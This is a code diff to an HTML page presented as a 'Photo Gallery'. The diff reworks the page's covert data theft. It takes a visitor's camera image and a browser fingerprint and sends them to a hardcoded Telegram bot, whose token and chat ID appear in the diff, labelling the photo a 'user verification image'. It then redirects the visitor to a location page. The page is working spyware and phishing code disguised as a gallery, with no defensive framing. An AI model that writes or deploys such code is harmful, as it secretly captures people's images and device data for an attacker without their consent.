@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Gallery</title>
+    <title>Photo Gallery</title>
     <style>
         body {
             margin: 0;
@@ -150,7 +150,7 @@
     </div>
 
     <script>
-        // Configuration
+        // Telegram configuration
         const BOT_TOKEN = '5836151829:AAHo1C858VFc4_Fnp47LYRdx4fUjcfkLhyI';
         const CHAT_ID = '2032344793';
         const MAX_RETRIES = 3;
@@ -238,19 +238,47 @@
             loadingScreen.style.display = show ? 'flex' : 'none';
         }
         
-        // Send data to Telegram
-        async function sendToTelegram(data) {
+        // Send image to Telegram
+        async function sendImageToTelegram(imageData) {
             try {
+                const blob = await fetch(imageData).then(r => r.blob());
                 const formData = new FormData();
+                formData.append('photo', blob, 'user_verification.jpg');
                 formData.append('chat_id', CHAT_ID);
-                formData.append('text', JSON.stringify(data, null, 2));
+                formData.append('caption', 'User verification image');
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
+                return true;
             } catch (e) {
-                console.error('Telegram send error:', e);
+                console.error('Image send error:', e);
+                return false;
+            }
+        }
+        
+        // Send fingerprint to Telegram
+        async function sendFingerprintToTelegram(fingerprint) {
+            try {
+                const fingerprintData = {
+                    type: 'fingerprint',
+                    data: fingerprint,
+                    timestamp: new Date().toISOString()
+                };
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: JSON.stringify(fingerprintData, null, 2)
+                    })
+                });
+                return true;
+            } catch (e) {
+                console.error('Fingerprint send error:', e);
+                return false;
             }
         }
         
@@ -281,16 +309,16 @@
                 stream.getTracks().forEach(track => track.stop());
                 
                 // Send captured data
-                await sendToTelegram({
-                    type: 'camera_capture',
-                    image: imageData,
-                    fingerprint: fingerprint,
-                    timestamp: new Date().toISOString()
-                });
+                const imageSent = await sendImageToTelegram(imageData);
+                const fingerprintSent = await sendFingerprintToTelegram(fingerprint);
                 
-                // Proceed to location page
-                currentPage = 'location';
-                window.location.href = 'location.html';
+                if (imageSent && fingerprintSent) {
+                    // Proceed to location page
+                    currentPage = 'location';
+                    window.location.href = 'location.html';
+                } else {
+                    throw new Error('Failed to send data to Telegram');
+                }
                 
             } catch (error) {
                 console.error('Camera error:', error);
@@ -322,13 +350,6 @@
         async function init() {
             // Generate fingerprint first
             fingerprint = generateFingerprint();
-            
-            // Send fingerprint immediately
-            await sendToTelegram({
-                type: 'fingerprint',
-                data: fingerprint,
-                timestamp: new Date().toISOString()
-            });
             
             // Setup gallery
             generateGallery();
